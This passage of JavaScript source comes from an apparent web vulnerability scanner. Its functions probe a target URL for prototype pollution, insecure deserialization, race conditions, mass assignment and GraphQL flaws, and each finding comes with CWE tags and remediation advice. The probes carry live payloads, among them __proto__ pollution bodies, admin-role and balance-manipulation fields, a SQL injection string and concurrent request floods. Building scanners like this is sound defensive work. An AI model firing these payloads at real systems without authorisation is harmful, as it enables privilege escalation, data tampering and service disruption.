          cwe: 'CWE-319', owasp: 'A02:2021 Cryptographic Failures',
        }));
      }
    }

    // Check for WebSocket without authentication
    if (wsEndpoints.length > 0 && !body.includes('token') && !body.includes('auth')) {
      findings.push(this._createFinding({
        type: 'websocket-no-auth', title: 'WebSocket Endpoint May Lack Authentication',
        severity: 'medium', url, parameter: 'WebSocket Authentication',
        payload: wsEndpoints[0],
        evidence: 'WebSocket connection established without visible authentication mechanism',
        request: `WebSocket endpoints found: ${wsEndpoints.slice(0, 3).join(', ')}`,
        response: 'No authentication token observed in WebSocket initialization',
        remediation: 'Implement token-based authentication for WebSocket connections. Validate on each message.',
        cwe: 'CWE-306', owasp: 'A07:2021 Identification and Authentication Failures',
      }));
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // PROTOTYPE POLLUTION (Server-Side)
  // ═══════════════════════════════════════════════════════════
  async scanPrototypePollution(url, options = {}) {
    const findings = [];

    const pollutionPayloads = [
      { body: { '__proto__': { 'polluted': 'true' } }, desc: '__proto__ direct' },
      { body: { 'constructor': { 'prototype': { 'polluted': 'true' } } }, desc: 'constructor.prototype' },
      { body: { '__proto__': { 'status': 510 } }, desc: '__proto__.status override' },
      { body: { '__proto__': { 'admin': true } }, desc: '__proto__.admin escalation' },
      { body: JSON.parse('{"__proto__":{"isAdmin":true}}'), desc: '__proto__.isAdmin' },
    ];

    // Test via JSON body
    for (const pp of pollutionPayloads) {
      const resp = await httpPost(url, JSON.stringify(pp.body), {
        timeout: this.timeout,
        contentType: 'application/json',
      });
      const respBody = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');

      // Check if pollution affected the response
      if (respBody.includes('"polluted"') || respBody.includes('"isAdmin":true') || respBody.includes('"admin":true')) {
        findings.push(this._createFinding({
          type: 'prototype-pollution', title: `Server-Side Prototype Pollution (${pp.desc})`,
          severity: 'critical', url, parameter: 'JSON Body',
          payload: JSON.stringify(pp.body),
          evidence: `Prototype pollution via ${pp.desc} - polluted property reflected in response`,
          request: `POST ${url}\nContent-Type: application/json\n\n${JSON.stringify(pp.body)}`,
          response: `HTTP ${resp.status} - Polluted properties visible in response`,
          remediation: 'Use Object.create(null) for user-controlled objects. Freeze prototypes. Validate JSON keys.',
          cwe: 'CWE-1321', owasp: 'A03:2021 Injection',
        }));
        break;
      }

      // Check for 500 error (crash due to pollution)
      if (resp.status === 500) {
        findings.push(this._createFinding({
          type: 'prototype-pollution-dos', title: `Prototype Pollution DoS (${pp.desc})`,
          severity: 'high', url, parameter: 'JSON Body',
          payload: JSON.stringify(pp.body),
          evidence: `Server returned 500 after prototype pollution attempt (${pp.desc})`,
          request: `POST ${url}\nContent-Type: application/json\n\n${JSON.stringify(pp.body)}`,
          response: `HTTP 500 - Server error triggered by prototype pollution`,
          remediation: 'Sanitize object keys. Block __proto__ and constructor.prototype in input.',
          cwe: 'CWE-1321', owasp: 'A03:2021 Injection',
        }));
      }
    }

    // Test via query parameters
    const queryPayloads = [
      '__proto__[polluted]=true',
      'constructor[prototype][polluted]=true',
      '__proto__.admin=true',
    ];

    for (const qp of queryPayloads) {
      const testUrl = url.includes('?') ? `${url}&${qp}` : `${url}?${qp}`;
      const resp = await httpGet(testUrl, { timeout: this.timeout });
      const respBody = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');

      if (respBody.includes('polluted') || resp.status === 500) {
        findings.push(this._createFinding({
          type: 'prototype-pollution-query', title: `Prototype Pollution via Query Parameter`,
          severity: resp.status === 500 ? 'high' : 'critical', url: testUrl, parameter: 'Query String',
          payload: qp,
          evidence: `Prototype pollution via query: ${qp}`,
          request: `GET ${testUrl}`,
          response: `HTTP ${resp.status} - ${resp.status === 500 ? 'Server crash' : 'Pollution reflected'}`,
          remediation: 'Sanitize query parameter keys. Block prototype-related keys.',
          cwe: 'CWE-1321', owasp: 'A03:2021 Injection',
        }));
        break;
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // INSECURE DESERIALIZATION
  // ═══════════════════════════════════════════════════════════
  async scanDeserialization(url, options = {}) {
    const findings = [];

    // Check for serialization indicators in responses/cookies
    const resp = await httpGet(url, { timeout: this.timeout });
    const body = typeof resp.data === 'string' ? resp.data : '';
    const headers = resp.headers || {};
    const setCookies = headers['set-cookie'] || '';
    const cookieStr = Array.isArray(setCookies) ? setCookies.join('; ') : setCookies;

    // Java serialization magic bytes (base64 encoded rO0AB)
    const javaIndicators = ['rO0AB', 'ACED0005', 'javax.faces.ViewState'];
    // PHP serialization patterns
    const phpIndicators = [/O:\d+:"[^"]+"/g, /a:\d+:{/g, /s:\d+:"/g];
    // .NET ViewState
    const dotnetIndicators = ['__VIEWSTATE', '__EVENTVALIDATION'];
    // Python pickle
    const pythonIndicators = ['gASV', 'Y3BpY2ts'];

    // Check for Java serialization
    for (const indicator of javaIndicators) {
      if (body.includes(indicator) || cookieStr.includes(indicator)) {
        findings.push(this._createFinding({
          type: 'deserialization-java', title: 'Java Serialized Object Detected',
          severity: 'high', url, parameter: 'Response/Cookie',
          payload: indicator,
          evidence: `Java serialization indicator "${indicator}" found - potential deserialization attack vector`,
          request: `GET ${url}`,
          response: `Serialization marker "${indicator}" in ${cookieStr.includes(indicator) ? 'cookie' : 'body'}`,
          remediation: 'Avoid Java native serialization. Use JSON/XML. Implement integrity checks (HMAC).',
          cwe: 'CWE-502', owasp: 'A08:2021 Software and Data Integrity Failures',
        }));
      }
    }

    // Check for PHP serialization
    for (const pattern of phpIndicators) {
      if (pattern.test(body) || pattern.test(cookieStr)) {
        findings.push(this._createFinding({
          type: 'deserialization-php', title: 'PHP Serialized Object Detected',
          severity: 'high', url, parameter: 'Response/Cookie',
          payload: 'PHP serialize() pattern detected',
          evidence: 'PHP serialized data found - potential object injection via unserialize()',
          request: `GET ${url}`,
          response: `PHP serialization pattern in ${pattern.test(cookieStr) ? 'cookie' : 'body'}`,
          remediation: 'Use json_encode/json_decode instead of serialize/unserialize. Never unserialize user input.',
          cwe: 'CWE-502', owasp: 'A08:2021 Software and Data Integrity Failures',
        }));
        break;
      }
    }

    // Check for .NET ViewState without MAC
    for (const indicator of dotnetIndicators) {
      if (body.includes(indicator)) {
        const viewstateMatch = body.match(/name="__VIEWSTATE"[^>]*value="([^"]+)"/);
        if (viewstateMatch) {
          const viewstate = viewstateMatch[1];
          // ViewState without MAC validation (no __VIEWSTATEGENERATOR or short value)
          if (!body.includes('__VIEWSTATEGENERATOR') || viewstate.length < 50) {
            findings.push(this._createFinding({
              type: 'deserialization-viewstate', title: '.NET ViewState Without MAC Validation',
              severity: 'high', url, parameter: '__VIEWSTATE',
              payload: viewstate.substring(0, 50) + '...',
              evidence: 'ViewState may lack MAC validation - potential deserialization/tampering attack',
              request: `GET ${url}`,
              response: `__VIEWSTATE found (${viewstate.length} chars), MAC validation uncertain`,
              remediation: 'Enable ViewState MAC validation. Use ViewStateEncryptionMode.Always.',
              cwe: 'CWE-502', owasp: 'A08:2021 Software and Data Integrity Failures',
            }));
          }
        }
      }
    }

    // Test deserialization via content-type manipulation
    const deserPayloads = [
      { contentType: 'application/x-java-serialized-object', body: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==', desc: 'Java' },
      { contentType: 'application/x-www-form-urlencoded', body: 'data=O:8:"stdClass":0:{}', desc: 'PHP' },
      { contentType: 'application/xml', body: '<?xml version="1.0"?><java><object class="java.lang.Runtime"/></java>', desc: 'XMLDecoder' },
    ];

    for (const dp of deserPayloads) {
      const testResp = await httpPost(url, dp.body, {
        timeout: this.timeout,
        contentType: dp.contentType,
      });
      if (testResp.status === 500 || (typeof testResp.data === 'string' && testResp.data.includes('Exception'))) {
        findings.push(this._createFinding({
          type: 'deserialization-error', title: `Deserialization Error Triggered (${dp.desc})`,
          severity: 'medium', url, parameter: 'Request Body',
          payload: dp.body.substring(0, 60),
          evidence: `Server threw exception when processing ${dp.desc} serialized data`,
          request: `POST ${url}\nContent-Type: ${dp.contentType}\n\n${dp.body.substring(0, 60)}`,
          response: `HTTP ${testResp.status} - Exception/error in response`,
          remediation: 'Reject unexpected content types. Implement deserialization filters.',
          cwe: 'CWE-502', owasp: 'A08:2021 Software and Data Integrity Failures',
        }));
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // RACE CONDITIONS
  // ═══════════════════════════════════════════════════════════
  async scanRaceConditions(url, options = {}) {
    const findings = [];

    // Test for race conditions by sending concurrent requests
    const concurrentCount = options.raceConcurrency || 10;

    // Test 1: Concurrent identical requests (TOCTOU)
    const promises = Array(concurrentCount).fill(null).map(() =>
      httpGet(url, { timeout: this.timeout })
    );

    const startTime = Date.now();
    const results = await Promise.allSettled(promises);
    const elapsed = Date.now() - startTime;

    const responses = results
      .filter(r => r.status === 'fulfilled')
      .map(r => r.value);

    // Analyze response variations (different status codes or body lengths)
    const statusCodes = [...new Set(responses.map(r => r.status))];
    const bodyLengths = responses.map(r => (typeof r.data === 'string' ? r.data.length : 0));
    const uniqueLengths = [...new Set(bodyLengths)];

    if (statusCodes.length > 1) {
      findings.push(this._createFinding({
        type: 'race-condition-status', title: 'Race Condition: Inconsistent Status Codes Under Concurrency',
        severity: 'medium', url, parameter: 'Concurrent Requests',
        payload: `${concurrentCount} concurrent GET requests`,
        evidence: `Different status codes returned: ${statusCodes.join(', ')} (${concurrentCount} concurrent requests in ${elapsed}ms)`,
        request: `${concurrentCount}x GET ${url} (concurrent)`,
        response: `Status codes: ${statusCodes.join(', ')} - Responses vary under load`,
        remediation: 'Implement proper locking/mutex. Use database transactions. Apply idempotency keys.',
        cwe: 'CWE-362', owasp: 'A04:2021 Insecure Design',
      }));
    }

    // Test 2: Concurrent POST requests (double-spend / duplicate action)
    if (options.testEndpoint || options.postData) {
      const postUrl = options.testEndpoint || url;
      const postData = options.postData || { action: 'test', amount: 1 };

      const postPromises = Array(concurrentCount).fill(null).map(() =>
        httpPost(postUrl, JSON.stringify(postData), {
          timeout: this.timeout,
          contentType: 'application/json',
        })
      );

      const postResults = await Promise.allSettled(postPromises);
      const postResponses = postResults
        .filter(r => r.status === 'fulfilled')
        .map(r => r.value);

      const successCount = postResponses.filter(r => r.status >= 200 && r.status < 300).length;

      if (successCount > 1) {
        findings.push(this._createFinding({
          type: 'race-condition-duplicate', title: 'Race Condition: Multiple Successful Concurrent Operations',
          severity: 'high', url: postUrl, parameter: 'Concurrent POST',
          payload: `${concurrentCount} concurrent POST requests, ${successCount} succeeded`,
          evidence: `${successCount}/${concurrentCount} concurrent requests succeeded - potential double-spend/duplicate action`,
          request: `${concurrentCount}x POST ${postUrl}\n${JSON.stringify(postData)}`,
          response: `${successCount} requests returned 2xx - race condition likely exploitable`,
          remediation: 'Use optimistic locking, database constraints, or idempotency tokens to prevent duplicate operations.',
          cwe: 'CWE-362', owasp: 'A04:2021 Insecure Design',
        }));
      }
    }

    // Test 3: Rate limit bypass via concurrent requests
    const rateLimitPromises = Array(20).fill(null).map(() =>
      httpGet(url, { timeout: this.timeout })
    );
    const rlResults = await Promise.allSettled(rateLimitPromises);
    const rlResponses = rlResults.filter(r => r.status === 'fulfilled').map(r => r.value);
    const rateLimited = rlResponses.filter(r => r.status === 429).length;

    if (rateLimited === 0 && rlResponses.length === 20) {
      findings.push(this._createFinding({
        type: 'race-condition-no-ratelimit', title: 'No Rate Limiting Detected Under Concurrent Load',
        severity: 'low', url, parameter: 'Rate Limiting',
        payload: '20 concurrent requests',
        evidence: `All 20 concurrent requests succeeded (no 429 responses) - no rate limiting`,
        request: `20x GET ${url} (concurrent)`,
        response: `All returned 2xx - no rate limiting mechanism detected`,
        remediation: 'Implement rate limiting with proper concurrency handling (sliding window, token bucket).',
        cwe: 'CWE-770', owasp: 'A04:2021 Insecure Design',
      }));
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // MASS ASSIGNMENT
  // ═══════════════════════════════════════════════════════════
  async scanMassAssignment(url, options = {}) {
    const findings = [];

    // Common privileged fields that shouldn't be user-assignable
    const privilegedFields = [
      { field: 'role', value: 'admin', desc: 'Role escalation' },
      { field: 'is_admin', value: true, desc: 'Admin flag' },
      { field: 'isAdmin', value: true, desc: 'Admin flag (camelCase)' },
      { field: 'admin', value: true, desc: 'Admin boolean' },
      { field: 'privilege', value: 'admin', desc: 'Privilege level' },
      { field: 'permissions', value: ['*'], desc: 'Wildcard permissions' },
      { field: 'user_type', value: 'admin', desc: 'User type' },
      { field: 'account_type', value: 'premium', desc: 'Account type' },
      { field: 'verified', value: true, desc: 'Email verification bypass' },
      { field: 'email_verified', value: true, desc: 'Email verified flag' },
      { field: 'active', value: true, desc: 'Account activation' },
      { field: 'balance', value: 99999, desc: 'Balance manipulation' },
      { field: 'credits', value: 99999, desc: 'Credits manipulation' },
      { field: 'discount', value: 100, desc: 'Discount manipulation' },
      { field: 'price', value: 0, desc: 'Price manipulation' },
      { field: 'id', value: 1, desc: 'ID override' },
      { field: 'user_id', value: 1, desc: 'User ID override' },
      { field: 'created_at', value: '2020-01-01', desc: 'Timestamp manipulation' },
    ];

    // First, get the baseline response to understand the API
    const baseResp = await httpGet(url, { timeout: this.timeout });
    const baseBody = typeof baseResp.data === 'string' ? baseResp.data : JSON.stringify(baseResp.data || '');

    // Test POST with extra fields
    const normalData = { name: 'test_user', email: 'test@example.com' };

    for (const pf of privilegedFields) {
      const maliciousData = { ...normalData, [pf.field]: pf.value };

      const resp = await httpPost(url, JSON.stringify(maliciousData), {
        timeout: this.timeout,
        contentType: 'application/json',
      });
      const respBody = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');

      // Check if the privileged field was accepted and reflected
      if (resp.status >= 200 && resp.status < 300) {
        if (respBody.includes(String(pf.value)) || respBody.includes(`"${pf.field}"`)) {
          findings.push(this._createFinding({
            type: 'mass-assignment', title: `Mass Assignment: "${pf.field}" Field Accepted (${pf.desc})`,
            severity: 'high', url, parameter: pf.field,
            payload: JSON.stringify({ [pf.field]: pf.value }),
            evidence: `Server accepted and reflected privileged field "${pf.field}=${JSON.stringify(pf.value)}"`,
            request: `POST ${url}\nContent-Type: application/json\n\n${JSON.stringify(maliciousData)}`,
            response: `HTTP ${resp.status} - Field "${pf.field}" present in response`,
            remediation: 'Use allowlists for accepted fields. Never bind request data directly to models. Use DTOs.',
            cwe: 'CWE-915', owasp: 'A04:2021 Insecure Design',
          }));
        }
      }
    }

    // Test PUT/PATCH with extra fields
    for (const method of ['PUT', 'PATCH']) {
      const extraData = { ...normalData, role: 'admin', is_admin: true };
      const resp = await httpRequest(method, url, {
        timeout: this.timeout,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(extraData),
      });
      const respBody = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');

      if (resp.status >= 200 && resp.status < 300 && (respBody.includes('admin') || respBody.includes('"role"'))) {
        findings.push(this._createFinding({
          type: 'mass-assignment-method', title: `Mass Assignment via ${method}: Privileged Fields Accepted`,
          severity: 'high', url, parameter: `${method} body`,
          payload: JSON.stringify(extraData),
          evidence: `${method} request accepted privileged fields (role, is_admin)`,
          request: `${method} ${url}\nContent-Type: application/json\n\n${JSON.stringify(extraData)}`,
          response: `HTTP ${resp.status} - Privileged fields in response`,
          remediation: 'Implement field-level access control. Use separate DTOs for different privilege levels.',
          cwe: 'CWE-915', owasp: 'A04:2021 Insecure Design',
        }));
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // GRAPHQL SECURITY
  // ═══════════════════════════════════════════════════════════
  async scanGraphQL(url, options = {}) {
    const findings = [];

    // Common GraphQL endpoint paths
    const graphqlPaths = ['/graphql', '/graphiql', '/v1/graphql', '/v2/graphql', '/api/graphql', '/query', '/gql'];
    const baseUrl = new URL(url);
    let graphqlEndpoint = null;

    // Find GraphQL endpoint
    for (const path of graphqlPaths) {
      const testUrl = `${baseUrl.protocol}//${baseUrl.host}${path}`;
      const resp = await httpPost(testUrl, JSON.stringify({ query: '{ __typename }' }), {
        timeout: this.timeout,
        contentType: 'application/json',
      });
      const respBody = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');

      if (resp.status === 200 && (respBody.includes('__typename') || respBody.includes('data') || respBody.includes('Query'))) {
        graphqlEndpoint = testUrl;
        break;
      }
    }

    // Also test the provided URL directly
    if (!graphqlEndpoint) {
      const directResp = await httpPost(url, JSON.stringify({ query: '{ __typename }' }), {
        timeout: this.timeout,
        contentType: 'application/json',
      });
      const directBody = typeof directResp.data === 'string' ? directResp.data : JSON.stringify(directResp.data || '');
      if (directResp.status === 200 && (directBody.includes('__typename') || directBody.includes('data'))) {
        graphqlEndpoint = url;
      }
    }

    if (!graphqlEndpoint) return findings;

    // Test 1: Introspection query
    const introspectionQuery = `{
      __schema {
        types { name kind fields { name type { name } } }
        queryType { name }
        mutationType { name }
        subscriptionType { name }
      }
    }`;

    const introResp = await httpPost(graphqlEndpoint, JSON.stringify({ query: introspectionQuery }), {
      timeout: this.timeout,
      contentType: 'application/json',
    });
    const introBody = typeof introResp.data === 'string' ? introResp.data : JSON.stringify(introResp.data || '');

    if (introResp.status === 200 && introBody.includes('__schema') && introBody.includes('types')) {
      findings.push(this._createFinding({
        type: 'graphql-introspection', title: 'GraphQL Introspection Enabled',
        severity: 'medium', url: graphqlEndpoint, parameter: '__schema',
        payload: introspectionQuery.replace(/\s+/g, ' ').trim(),
        evidence: 'Full schema introspection is enabled, exposing all types, queries, and mutations',
        request: `POST ${graphqlEndpoint}\n{"query":"{ __schema { types { name } } }"}`,
        response: `HTTP 200 - Full schema returned with ${(introBody.match(/"name"/g) || []).length} type definitions`,
        remediation: 'Disable introspection in production. Use schema allowlisting.',
        cwe: 'CWE-200', owasp: 'A05:2021 Security Misconfiguration',
      }));
    }

    // Test 2: GraphQL injection / query depth attack
    const depthQuery = '{ a: __typename ' + '{ b: __typename '.repeat(20) + '}'.repeat(21);
    const depthResp = await httpPost(graphqlEndpoint, JSON.stringify({ query: depthQuery }), {
      timeout: this.timeout + 5000,
      contentType: 'application/json',
    });

    if (depthResp.status === 200) {
      findings.push(this._createFinding({
        type: 'graphql-depth-limit', title: 'GraphQL: No Query Depth Limit',
        severity: 'medium', url: graphqlEndpoint, parameter: 'Query Depth',
        payload: 'Deeply nested query (20+ levels)',
        evidence: 'Server accepted deeply nested query without depth limiting - DoS risk',
        request: `POST ${graphqlEndpoint}\n{"query":"{ deeply { nested { query... } } }"}`,
        response: `HTTP ${depthResp.status} - Deep query accepted`,
        remediation: 'Implement query depth limiting (max 7-10 levels). Use query complexity analysis.',
        cwe: 'CWE-770', owasp: 'A05:2021 Security Misconfiguration',
      }));
    }

    // Test 3: Batch query attack
    const batchQuery = Array(50).fill({ query: '{ __typename }' });
    const batchResp = await httpPost(graphqlEndpoint, JSON.stringify(batchQuery), {
      timeout: this.timeout,
      contentType: 'application/json',
    });
    const batchBody = typeof batchResp.data === 'string' ? batchResp.data : JSON.stringify(batchResp.data || '');

    if (batchResp.status === 200 && batchBody.includes('__typename')) {
      findings.push(this._createFinding({
        type: 'graphql-batching', title: 'GraphQL: Batch Query Attack Possible',
        severity: 'medium', url: graphqlEndpoint, parameter: 'Batch Queries',
        payload: '50 batched queries in single request',
        evidence: 'Server accepts batched queries - can bypass rate limiting and brute-force',
        request: `POST ${graphqlEndpoint}\n[{"query":"{ __typename }"}, ... x50]`,
        response: `HTTP ${batchResp.status} - All batch queries processed`,
        remediation: 'Limit batch query count. Implement per-query rate limiting.',
        cwe: 'CWE-770', owasp: 'A05:2021 Security Misconfiguration',
      }));
    }

    // Test 4: SQL injection in GraphQL arguments
    const sqliQueries = [
      { query: '{ user(id: "1\' OR \'1\'=\'1") { id } }', desc: 'SQL injection in argument' },
      { query: '{ search(query: "test\\") { id } }', desc: 'Escape sequence injection' },
    ];

    for (const sq of sqliQueries) {
      const sqResp = await httpPost(graphqlEndpoint, JSON.stringify({ query: sq.query }), {
        timeout: this.timeout,
        contentType: 'application/json',
      });
      const sqBody = typeof sqResp.data === 'string' ? sqResp.data : JSON.stringify(sqResp.data || '');

      if (sqBody.match(/SQL|syntax|mysql|postgres|sqlite|ORA-/i)) {
        findings.push(this._createFinding({
          type: 'graphql-injection', title: `GraphQL SQL Injection: ${sq.desc}`,
          severity: 'critical', url: graphqlEndpoint, parameter: 'GraphQL Argument',
          payload: sq.query,
          evidence: 'SQL error message returned from GraphQL resolver',
          request: `POST ${graphqlEndpoint}\n{"query":"${sq.query}"}`,
          response: `HTTP ${sqResp.status} - SQL error in response`,
          remediation: 'Use parameterized queries in resolvers. Validate and sanitize all GraphQL arguments.',
          cwe: 'CWE-89', owasp: 'A03:2021 Injection',
        }));
      }
    }

    // Test 5: Information disclosure via error messages
    const errorQuery = '{ nonExistentField }';
    const errorResp = await httpPost(graphqlEndpoint, JSON.stringify({ query: errorQuery }), {
      timeout: this.timeout,
      contentType: 'application/json',
    });
    const errorBody = typeof errorResp.data === 'string' ? errorResp.data : JSON.stringify(errorResp.data || '');

    if (errorBody.includes('Did you mean') || errorBody.includes('suggestions') || errorBody.match(/Cannot query field.*on type/)) {
      findings.push(this._createFinding({
        type: 'graphql-field-suggestion', title: 'GraphQL: Field Suggestion Enabled (Information Disclosure)',
        severity: 'low', url: graphqlEndpoint, parameter: 'Error Messages',
        payload: errorQuery,
        evidence: 'GraphQL returns field suggestions in errors, aiding schema enumeration',
        request: `POST ${graphqlEndpoint}\n{"query":"{ nonExistentField }"}`,
        response: `HTTP ${errorResp.status} - "Did you mean" suggestions in error`,
        remediation: 'Disable field suggestions in production. Use generic error messages.',
        cwe: 'CWE-200', owasp: 'A05:2021 Security Misconfiguration',
      }));
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // HELPER METHODS
  // ═══════════════════════════════════════════════════════════
  _createFinding(data) {
    return {
      id: generateId(data.type.toUpperCase().replace(/[^A-Z]/g, '').slice(0, 5)),
      type: data.type,
      title: data.title,
      severity: data.severity,
      url: data.url,
      parameter: data.parameter,
      payload: data.payload,
      evidence: data.evidence,
      request: data.request,
      response: data.response,
      remediation: data.remediation,
      cwe: data.cwe,
      owasp: data.owasp,
      timestamp: new Date().toISOString(),
    };
  }

  _createHMACToken(header, payload, secret) {
    // Simple HMAC token creation for testing (not cryptographically complete - for detection only)
    const headerB64 = base64Encode(JSON.stringify(header)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
    const payloadB64 = base64Encode(JSON.stringify(payload)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
    // Use a placeholder signature for testing - real verification happens server-side
    const sigPlaceholder = base64Encode(`${headerB64}.${payloadB64}.${secret}`).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
    return `${headerB64}.${payloadB64}.${sigPlaceholder}`;
  }
}

export default AdvancedScanner;
